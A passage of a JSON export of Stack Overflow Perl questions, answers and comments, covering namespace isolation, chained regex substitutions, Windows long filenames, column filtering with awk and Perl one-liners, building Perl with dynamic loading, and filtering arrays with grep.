"reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 543, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1447263253, "creation_date": 1447261423, "question_id": 33655811, "link": "https://stackoverflow.com/questions/33655811/difference-between-function-and-subroutine-in-perl", "title": "Difference between function and subroutine in Perl", "body": "<p>I\u00b4m newbie in <code>perl</code> and I need to define a subroutine in <code>perl</code>, but I don't understand the difference between <code>subroutine</code> and <code>function</code>.</p>\n\n<p>When should I use any of them and how can I send parameters?</p>\n"}, {"tags": ["perl", "namespaces", "require", "perl-module"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1447263607, "post_id": 33655772, "comment_id": 55086208, "body": "Re &quot;Since B.pm doesn&#39;t have a package pkg_B; header in it&quot; Well, there&#39;s the error."}], "answers": [{"comments": [{"owner": {"reputation": 18319, "user_id": 472485, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/eaad078400b012b1e37fa6f11dd5c089?s=128&d=identicon&r=PG", "display_name": "Jean", "link": "https://stackoverflow.com/users/472485/jean"}, "edited": false, "score": 0, "creation_date": 1447264003, "post_id": 33656465, "comment_id": 55086442, "body": "<code>you better should fix your code</code>  You mean fix <code>B.pm </code> ?"}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "reply_to_user": {"reputation": 18319, "user_id": 472485, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/eaad078400b012b1e37fa6f11dd5c089?s=128&d=identicon&r=PG", "display_name": "Jean", "link": "https://stackoverflow.com/users/472485/jean"}, "edited": false, "score": 0, "creation_date": 1447264104, "post_id": 33656465, "comment_id": 55086501, "body": "@Jean: yes, use a proper namespace inside the module"}, {"owner": {"reputation": 18319, "user_id": 472485, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/eaad078400b012b1e37fa6f11dd5c089?s=128&d=identicon&r=PG", "display_name": "Jean", "link": "https://stackoverflow.com/users/472485/jean"}, "edited": false, "score": 0, "creation_date": 1447264250, "post_id": 33656465, "comment_id": 55086577, "body": "Hmm.. <code>B.pm</code> is a legacy piece of code which I don&#39;t own."}, {"owner": {"reputation": 3984, "user_id": 1801086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef4c0400ffff14d5e1c16ca3856c09ba?s=128&d=identicon&r=PG", "display_name": "tjd", "link": "https://stackoverflow.com/users/1801086/tjd"}, "edited": false, "score": 2, "creation_date": 1447267074, "post_id": 33656465, "comment_id": 55088358, "body": "If <a href=\"https://en.wikipedia.org/wiki/Pointy-haired_Boss\" rel=\"nofollow noreferrer\">PHB</a> forbids you from modifying the legacy code, and you don&#39;t want to wrap it in a package, you could always wrap your own competing code in a package..."}], "tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": false, "score": 5, "last_activity_date": 1447263440, "creation_date": 1447263440, "answer_id": 33656465, "question_id": 33655772, "link": "https://stackoverflow.com/questions/33655772/isolate-namespaces-in-perl-script/33656465#33656465", "title": "Isolate namespaces in Perl script", "body": "<blockquote>\n  <p>... all subroutines are imported when I add use B (); in A.pl</p>\n</blockquote>\n\n<p>The subroutines are not imported. They are defined in the namespace of your B.pm file. Since this file has no package name the namespace is main, i.e. the same namespace as A.pl is. And thus you have the conflict of two symbols with the name name inside the same namespace. What you could do is to include B.pm inside its own namespace, e.g.</p>\n\n<pre><code>{\n     package Foo;\n     do 'B.pm';  # defines sub foo\n}\n\nsub foo { ... }\n\nfoo(); # call local function\nFoo::foo(); # call function from B.pm\n</code></pre>\n\n<p>Note that this is only a bad hack to work around bad code and you better should fix your code. And note also that you should not call your file/module B.pm/B because there is a core module with this name already.</p>\n"}], "owner": {"reputation": 18319, "user_id": 472485, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/eaad078400b012b1e37fa6f11dd5c089?s=128&d=identicon&r=PG", "display_name": "Jean", "link": "https://stackoverflow.com/users/472485/jean"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 111, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1537402560, "creation_date": 1447261304, "last_edit_date": 1537402560, "question_id": 33655772, "link": "https://stackoverflow.com/questions/33655772/isolate-namespaces-in-perl-script", "title": "Isolate namespaces in Perl script", "body": "<p>I want to use a subroutine defined in a script <code>B.pm</code>(which I don't own) in my script <code>A.pl</code>. Since <code>B.pm</code> doesn't have a <code>package pkg_B;</code> header in it, all subroutines are imported when I add <code>use B ();</code> in <code>A.pl</code>. This results in <code>Subroutine redefined</code> warning when I try to run <code>A.pl</code>, since <code>A.pl</code> has a subroutine with the same name as that in <code>B.pm</code>. Is there a way I can isolate <code>B.pm</code>'s namespace from <code>A.pl</code> without touching <code>B.pm</code>(since there are many other scripts blatantly consuming <code>B.pm</code>'s subroutines without specifying scope)? My only solution seems to be renaming my subroutine, which I don't want to.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 4186, "user_id": 2773311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/wIGqo.png?s=128&g=1", "display_name": "Arc676", "link": "https://stackoverflow.com/users/2773311/arc676"}, "edited": false, "score": 1, "creation_date": 1447251158, "post_id": 33652321, "comment_id": 55077947, "body": "Could you provide some examples of expected behavior? Also, you can use <code>|</code> as &quot;or&quot; in regexes."}, {"owner": {"reputation": 3, "user_id": 3465722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0522ad852d972700d4990e4a32a3f746?s=128&d=identicon&r=PG&f=1", "display_name": "Kev", "link": "https://stackoverflow.com/users/3465722/kev"}, "reply_to_user": {"reputation": 4186, "user_id": 2773311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/wIGqo.png?s=128&g=1", "display_name": "Arc676", "link": "https://stackoverflow.com/users/2773311/arc676"}, "edited": false, "score": 0, "creation_date": 1447252923, "post_id": 33652321, "comment_id": 55079080, "body": "Using the above syntax does just the first substitution and I tried using other operators as well"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1447255919, "post_id": 33652321, "comment_id": 55081156, "body": "A chain of expressions separated with <code>or</code> will always stop when one of the expressions returns a true value. That&#39;s what it means when boolean operators are described as &quot;short-circuiting&quot;."}], "answers": [{"tags": [], "owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "is_accepted": false, "score": 1, "last_activity_date": 1447251201, "creation_date": 1447251201, "answer_id": 33652389, "question_id": 33652321, "link": "https://stackoverflow.com/questions/33652321/using-binding-operator-in-perl/33652389#33652389", "title": "Using binding operator in perl", "body": "<p>A simpler way might be to create an array of all such patterns and replacements, then simply iterate through your array applying the substitution one pattern at a time.</p>\n\n<pre><code>my $in = \"some string you want to modify\";\nmy @patterns = (\n   ['pattern to match', 'replacement string'],\n   # ...\n);\n\n$in = replace_many($in, \\@patterns);\n\nsub replace_many {\n   my ($in, $replacements) = @_;\n\n   foreach my $replacement ( @$replacements ) {\n      my ($pattern, $replace_string) = @$replacement;\n\n      $in =~ s/$pattern/$replace_string/;\n   }\n\n   return $in;  \n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 7958, "user_id": 1069726, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/2cbbae354bb4f5f320b93ab3ad4b0fa1?s=128&d=identicon&r=PG", "display_name": "LeoNerd", "link": "https://stackoverflow.com/users/1069726/leonerd"}, "is_accepted": false, "score": 2, "last_activity_date": 1447251310, "creation_date": 1447251310, "answer_id": 33652421, "question_id": 33652321, "link": "https://stackoverflow.com/questions/33652321/using-binding-operator-in-perl/33652421#33652421", "title": "Using binding operator in perl", "body": "<p>The closest you could get with a syntax looking similar to that would be</p>\n\n<pre><code>s/one/ONE/ or\ns/two/TWO/ or\n...\ns/ten/TEN/ for $str;\n</code></pre>\n\n<p>This will attempt each substitution in turn, once only, stopping after the first successful one.</p>\n"}, {"tags": [], "owner": {"reputation": 717, "user_id": 1483288, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/5b0b7a55223dba7a538aaf97dbbc6150?s=128&d=identicon&r=PG", "display_name": "ccc31807", "link": "https://stackoverflow.com/users/1483288/ccc31807"}, "is_accepted": false, "score": 0, "last_activity_date": 1447254054, "creation_date": 1447254054, "answer_id": 33653320, "question_id": 33652321, "link": "https://stackoverflow.com/questions/33652321/using-binding-operator-in-perl/33653320#33653320", "title": "Using binding operator in perl", "body": "<p>It's not at all clear what you need, and it's not at all clear that you can accomplish what you appear to want by the means you suggest. The OR operator is a short circuit operator, and you may not want this behavior. Please give an example of the input you expect, and the output you desire, hopefully several examples of each. Meanwhile, here is a test script.</p>\n\n<pre><code>   use warnings;\n   use strict;\n\n   my $in1 = 'George Walker Bush';\n   my $in2 = 'George Walker Bush';\n   my $in3 = 'George Walker Bush';\n   my $in4 = 'George Walker Bush';\n\n   (my $out1 = $in1) =~ s/e/*/g;\n   print \"out1 = $out1 \\n\";\n\n   (my $out2 = $in2) =~ s/Bush/Obama/;\n   print \"out2 = $out2 \\n\";\n\n   (my $out3 = $in3) =~ s/(George)|(Bush)/Obama/g;\n   print \"out3 = $out3\\n\";\n\n   $in4 =~ /(George)|(Walker)|(Bush)/g;\n   print \"$1 - $2 - $3\\n\";\n\n   exit(0);\n</code></pre>\n\n<p>You will notice in the last case that only the first OR operator matches in the regular expression. If you wanted to replace 'George Walker Bush' with Barack Hussein Obama', you could do that easily enough, but you would also replace 'George Washington'with 'Barack Washington' - is this what you want? Here is the output of the script:</p>\n\n<pre><code>out1 = G*org* Walk*r Bush\nout2 = George Walker Obama\nout3 = Obama Walker Obama\nUse of uninitialized value $2 in concatenation (.) or string at pq_151111a.plx line 19.\nUse of uninitialized value $3 in concatenation (.) or string at pq_151111a.plx line 19.\nGeorge -  -\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3, "user_id": 3465722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0522ad852d972700d4990e4a32a3f746?s=128&d=identicon&r=PG&f=1", "display_name": "Kev", "link": "https://stackoverflow.com/users/3465722/kev"}, "edited": false, "score": 0, "creation_date": 1447254599, "post_id": 33653343, "comment_id": 55080243, "body": "Thanks for your help. I tried using parenthesis to separate each substitution but it was still giving the first substitution only. I understand your point and I really appreciate it."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 3, "user_id": 3465722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0522ad852d972700d4990e4a32a3f746?s=128&d=identicon&r=PG&f=1", "display_name": "Kev", "link": "https://stackoverflow.com/users/3465722/kev"}, "edited": false, "score": 1, "creation_date": 1447254691, "post_id": 33653343, "comment_id": 55080317, "body": "@Kev, Reread what Dave Cross wrote. <code>($in =~ s&#47;pattern1&#47;replacement1&#47;) or (s&#47;pattern2&#47;replacement2&#47;)</code> isn&#39;t a solution; it&#39;s the meaning of what you wrote."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 2, "last_activity_date": 1598211435, "last_edit_date": 1598211435, "creation_date": 1447254117, "answer_id": 33653343, "question_id": 33652321, "link": "https://stackoverflow.com/questions/33652321/using-binding-operator-in-perl/33653343#33653343", "title": "Using binding operator in perl", "body": "<p>You can often get a clue about what the Perl makes of some code using <a href=\"https://metacpan.org/pod/B::Deparse\" rel=\"nofollow noreferrer\">B::Deparse</a>.</p>\n<pre><code>$ perl -MO=Deparse -E'$in =~ (s/pattern1/replacement1/)||(s/pattern2/replacement2/)'\n[ ... snip ... ]\ns/pattern2/replacement2/u unless $in =~ s/pattern1/replacement1/u;\n-e syntax OK\n</code></pre>\n<p>So it's attempting your first substitution on <code>$in</code>. And if that fails, it is then trying your second substitution. But it's not using <code>$in</code> for the second substitution, it's using <code>$_</code> instead.</p>\n<p>You're running up against precedence issues here. Perl interprets your code as:</p>\n<pre><code>($in =~ s/pattern1/replacement1/) or (s/pattern2/replacement2/)\n</code></pre>\n<p>Notice that the opening parenthesis has moved before <code>$in</code>.</p>\n<p>As others have pointed out, it's best to use a loop approach here. But I thought it might be useful to explain why your version didn't work.</p>\n<p><strong>Update:</strong> To be clear, if you wanted to use syntax like this, then you would need:</p>\n<pre><code>($in =~ s/pattern1/replacement1/) or\n($in =~ s/pattern2/replacement2/);\n</code></pre>\n<p>Note that I've included <code>$in =~</code> in each expression. At this point, it becomes obvious (I hope) why the looping solution is better.</p>\n<p>However, because <code>or</code> is a short-circuiting operator, this statement will stop after the first successful substitution. I assumed that's what you wanted from your use of it in your original code. If that's not what you want, then you need to either switch to using <code>and</code> or (better, in my opinion) break them out into separate statements.</p>\n<pre><code>$in =~ s/pattern1/replacement1/;\n$in =~ s/pattern2/replacement2/;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1447254533, "creation_date": 1447254533, "answer_id": 33653481, "question_id": 33652321, "link": "https://stackoverflow.com/questions/33652321/using-binding-operator-in-perl/33653481#33653481", "title": "Using binding operator in perl", "body": "<p>Use <code>for</code> to \"topicalize\" (alias <code>$_</code> to your variable).</p>\n\n<pre><code>for ($in) {\n   s/pattern/replacement/;\n   s/pattern/replacement/;\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 3465722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0522ad852d972700d4990e4a32a3f746?s=128&d=identicon&r=PG&f=1", "display_name": "Kev", "link": "https://stackoverflow.com/users/3465722/kev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 507, "favorite_count": 0, "accepted_answer_id": 33653343, "answer_count": 5, "score": 0, "last_activity_date": 1598211435, "creation_date": 1447250953, "last_edit_date": 1447250972, "question_id": 33652321, "link": "https://stackoverflow.com/questions/33652321/using-binding-operator-in-perl", "title": "Using binding operator in perl", "body": "<p>I am working on a program in perl and I am trying to combine more than one regex in a binding operator. I have tried using the syntax below but it's not working. I will like to know if there is any other way to go with this.</p>\n\n<pre><code>$in =~ (s/pattern/replacement/)||(s/pattern/replacement/)||...\n</code></pre>\n"}, {"tags": ["perl", "encoding"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1447250988, "post_id": 33651790, "comment_id": 55077824, "body": "<a href=\"http://p3rl.org/Win32::LongPath\" rel=\"nofollow noreferrer\">Win32::LongPath</a>?"}, {"owner": {"reputation": 29236, "user_id": 4727, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01a99498921b93509c73d390704bddf6?s=128&d=identicon&r=PG", "display_name": "Leon Timmermans", "link": "https://stackoverflow.com/users/4727/leon-timmermans"}, "edited": false, "score": 0, "creation_date": 1447253705, "post_id": 33651790, "comment_id": 55079602, "body": "This is a long standing Perl bug, going back two decades (oneperl). This should have been fixed years ago, but Win32 people with tuits and focus are in short supply."}, {"owner": {"reputation": 933, "user_id": 332394, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/557805fed3f810ac6ed7067db42bda43?s=128&d=identicon&r=PG", "display_name": "DaveKub", "link": "https://stackoverflow.com/users/332394/davekub"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1447258480, "post_id": 33651790, "comment_id": 55082932, "body": "@choroba - That worked!  Post it as an answer and I&#39;ll accept it!  Using opendirL, readdirL, and renameL did what I needed."}], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 0, "last_activity_date": 1447259085, "creation_date": 1447259085, "answer_id": 33655053, "question_id": 33651790, "link": "https://stackoverflow.com/questions/33651790/japanese-filename-being-read-as-8-3-on-windows/33655053#33655053", "title": "Japanese filename being read as 8.3 on Windows", "body": "<p>Have a look at <a href=\"http://p3rl.org/Win32::LongPath\" rel=\"nofollow\">Win32::LongPath</a>, it does exactly what you need.</p>\n"}], "owner": {"reputation": 933, "user_id": 332394, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/557805fed3f810ac6ed7067db42bda43?s=128&d=identicon&r=PG", "display_name": "DaveKub", "link": "https://stackoverflow.com/users/332394/davekub"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 33655053, "answer_count": 1, "score": 0, "last_activity_date": 1447259085, "creation_date": 1447249227, "question_id": 33651790, "link": "https://stackoverflow.com/questions/33651790/japanese-filename-being-read-as-8-3-on-windows", "title": "Japanese filename being read as 8.3 on Windows", "body": "<p>I'm working on a Windows system with Perl 5.8.8 (yes, it's old but it's what's on the server and I can't change that).  </p>\n\n<p>I've been sent a csv datafile from our Japan office.  The filename is 'a151110a\uff0801_WeLBA\u2460\uff09.csv'.  My perl script can open and read the file, but it sees the filename as 'A15111~1.CSV'; so it's interpreting the filename into 8.3 format.  I've tried using <code>glob</code> and <code>readdir</code> to create a file list and both give the same result.</p>\n\n<p>The problem is that I need to be able to pull some info out of the filename.  I need that part that is inside the parentheses, the '01_WeLBA' part.  But Perl doesn't seem to \"see\" that.  Those parentheses have a space (or other whitespace character) either in front or just after them.  If I manually remove those and that numeral '1'-inside-a-circle character, then Perl sees the filename as it is.</p>\n\n<p>Is there a way to get Perl to 'see' the filename as it appears in Windows Explorer?</p>\n"}, {"tags": ["perl", "shell", "unix", "text", "awk"], "comments": [{"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 1, "creation_date": 1447248815, "post_id": 33651373, "comment_id": 55076507, "body": "You can do this with awk easily enough. Show some of your attempts and explain how they failed."}], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 4, "last_activity_date": 1447248892, "creation_date": 1447248892, "answer_id": 33651682, "question_id": 33651373, "link": "https://stackoverflow.com/questions/33651373/printing-lines-if-a-specific-column-contains-values-0/33651682#33651682", "title": "Printing lines if a specific column contains values &gt;0", "body": "<p>Easy in Perl</p>\n\n<pre><code>perl -lane 'print \"$F[3]\\t$F[8]\" if $F[8] &gt; 0' &lt; input-file\n</code></pre>\n\n<ul>\n<li><code>-l</code> appends a newline to everything you print</li>\n<li><code>-a</code> splits the input into the <code>@F</code> array</li>\n<li><code>-n</code> processes the input line by line</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 1073, "user_id": 1039320, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/28ba137ea03056ffb3a2e6db49ac29cd?s=128&d=identicon&r=PG", "display_name": "jreisinger", "link": "https://stackoverflow.com/users/1039320/jreisinger"}, "is_accepted": false, "score": 3, "last_activity_date": 1447255471, "last_edit_date": 1447255471, "creation_date": 1447249239, "answer_id": 33651794, "question_id": 33651373, "link": "https://stackoverflow.com/questions/33651373/printing-lines-if-a-specific-column-contains-values-0/33651794#33651794", "title": "Printing lines if a specific column contains values &gt;0", "body": "<p>Can be done with the <a href=\"http://www.catonmat.net/download/perl1line.txt\" rel=\"nofollow\">Perl one-liner</a>:</p>\n\n<pre><code>$ perl -anE 'say join \"\\t\", @F[3,8] if $F[8] &gt; 0' data.txt\n</code></pre>\n\n<ul>\n<li><code>-n</code> (non-autoprinting) - loop through lines, reading but not printing them</li>\n<li><code>-a</code> (auto-split) - split the input line stored in <code>$_</code> into <code>@F</code> array (space is the default separator, change it with <code>-F</code>, ex. <code>-F:</code>)</li>\n<li><code>-E 'CODE'</code> (execute) - execute <code>'CODE'</code> enabling feature bundle (like <code>use 5.010</code>) for your version of Perl</li>\n</ul>\n\n<p>See <a href=\"http://perldoc.perl.org/perlrun.html\" rel=\"nofollow\">perlrun</a> for more.</p>\n"}, {"tags": [], "owner": {"reputation": 226874, "user_id": 1983854, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/eKpAk.png?s=128&g=1", "display_name": "fedorqui &#39;SO stop harming&#39;", "link": "https://stackoverflow.com/users/1983854/fedorqui-so-stop-harming"}, "is_accepted": false, "score": 1, "last_activity_date": 1447250223, "creation_date": 1447250223, "answer_id": 33652092, "question_id": 33651373, "link": "https://stackoverflow.com/questions/33651373/printing-lines-if-a-specific-column-contains-values-0/33652092#33652092", "title": "Printing lines if a specific column contains values &gt;0", "body": "<p><code>awk</code> handles it almost automatically!</p>\n\n<pre><code>awk '$9&gt;0 {print $4,$9}' file\n</code></pre>\n\n<p>If you need to specify the input and output separator, say:</p>\n\n<pre><code>awk 'BEGIN{FS=OFS=\"\\t\"} $9&gt;0 {print $4,$9}' file\n</code></pre>\n"}], "owner": {"reputation": 1261, "user_id": 4030463, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b152908db1fb6d0e205df83a47478488?s=128&d=identicon&r=PG&f=1", "display_name": "AnnaSchumann", "link": "https://stackoverflow.com/users/4030463/annaschumann"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 859, "favorite_count": 0, "accepted_answer_id": 33651682, "answer_count": 3, "score": 0, "last_activity_date": 1447255471, "creation_date": 1447247902, "last_edit_date": 1447250239, "question_id": 33651373, "link": "https://stackoverflow.com/questions/33651373/printing-lines-if-a-specific-column-contains-values-0", "title": "Printing lines if a specific column contains values &gt;0", "body": "<p>I have a tab-delimited .txt file in this format, containing numerous symbols, numerals and letters:</p>\n\n<pre><code>MUT 124 GET 288478  0   *       =   288478  0\nMUT 15  GET 514675  0   75MH    =   514637  -113\nMUT 124 GET 514637  0   75MH    =   514675  113\n</code></pre>\n\n<p>I want to identify all lines that contain a >0 value in the 9th column (i.e. only the 3rd row above would be extracted) and then print column 4 + 9 from any matched lines. </p>\n\n<p>Desired output (two column tab delimited .txt file):</p>\n\n<pre><code>514637    113\n</code></pre>\n\n<p>Is there a quick way to do this in terminal/on the command-line. If so, how?</p>\n\n<p>I've only just begun to learn awk and perl so all my attempts so far have been nowhere near close. Not sure where to begin!</p>\n"}, {"tags": ["perl", "ubuntu", "perl-module"], "comments": [{"owner": {"reputation": 4663, "user_id": 3967089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d00715119003023d62918dcc603ca7?s=128&d=identicon&r=PG&f=1", "display_name": "Calle Dybedahl", "link": "https://stackoverflow.com/users/3967089/calle-dybedahl"}, "edited": false, "score": 0, "creation_date": 1447247750, "post_id": 33650748, "comment_id": 55075937, "body": "Are you really sure the normal, system-delivered perl doesn&#39;t already have it? It&#39;d be weird if it didn&#39;t, but I don&#39;t have an Ubuntu that old around to check on."}], "answers": [{"tags": [], "owner": {"reputation": 62, "user_id": 3395784, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9b7921f3d70441feec80625508f5268b?s=128&d=identicon&r=PG&f=1", "display_name": "abhinav92003", "link": "https://stackoverflow.com/users/3395784/abhinav92003"}, "is_accepted": false, "score": 0, "last_activity_date": 1447525148, "creation_date": 1447525148, "answer_id": 33711724, "question_id": 33650748, "link": "https://stackoverflow.com/questions/33650748/installing-perl-with-dynamic-loading-on-ubuntu-11-04/33711724#33711724", "title": "Installing perl with dynamic loading on Ubuntu 11.04", "body": "<p>I found the solution. The flag for dynamic linking loader was missing. I added -ldl to the list of flags while running ./Configure script and it worked.\nThe correct dynamic loader for Ubuntu is dl_dlopen.xs itself.</p>\n"}], "owner": {"reputation": 62, "user_id": 3395784, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9b7921f3d70441feec80625508f5268b?s=128&d=identicon&r=PG&f=1", "display_name": "abhinav92003", "link": "https://stackoverflow.com/users/3395784/abhinav92003"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 118, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447525148, "creation_date": 1447245598, "question_id": 33650748, "link": "https://stackoverflow.com/questions/33650748/installing-perl-with-dynamic-loading-on-ubuntu-11-04", "title": "Installing perl with dynamic loading on Ubuntu 11.04", "body": "<p>I'm trying to install Perl on Ubuntu 11.04 and I need it to have dynamic loading option. During ./Configure it asks me location of source file for dynamic loader. I'm not able to find the appropriate one for linux. Using dl_dlopen.xs gives compile-time error about undefined references.</p>\n\n<p>Can anyone help me find the correct Dynamic Loader source file? Or tell me about any alternative way to install Perl with dynamic loading?</p>\n"}, {"tags": ["arrays", "perl", "foreach", "splice"], "comments": [{"owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "edited": false, "score": 1, "creation_date": 1447245849, "post_id": 33650563, "comment_id": 55074955, "body": "<code>splice</code> documentation is here: <a href=\"http://perldoc.perl.org/functions/splice.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/functions/splice.html</a>"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447270989, "post_id": 33650563, "comment_id": 55090656, "body": "You really don&#39;t want to add or remove array elements within the loop body."}], "answers": [{"tags": [], "owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "is_accepted": true, "score": 5, "last_activity_date": 1447246092, "creation_date": 1447246092, "answer_id": 33650873, "question_id": 33650563, "link": "https://stackoverflow.com/questions/33650563/how-do-i-call-elements-of-an-array-as-their-index-numerical-value/33650873#33650873", "title": "How do I call elements of an array as their index numerical value", "body": "<p>You'd better use <a href=\"http://perldoc.perl.org/functions/grep.html\">grep</a>:</p>\n\n<pre><code>@ORF = grep{ length($_) &gt; 50 } @ORF;\n</code></pre>\n"}], "owner": {"reputation": 333, "user_id": 4816093, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/SVtg6.png?s=128&g=1", "display_name": "cachemoi", "link": "https://stackoverflow.com/users/4816093/cachemoi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "accepted_answer_id": 33650873, "answer_count": 1, "score": 1, "last_activity_date": 1447246092, "creation_date": 1447244921, "last_edit_date": 1447245255, "question_id": 33650563, "link": "https://stackoverflow.com/questions/33650563/how-do-i-call-elements-of-an-array-as-their-index-numerical-value", "title": "How do I call elements of an array as their index numerical value", "body": "<p>I have an @ORF array consisting of strings of different length. I want to get rid of strings of less than 50 characters, so I wrote the following foreach loop:</p>\n\n<pre><code>foreach 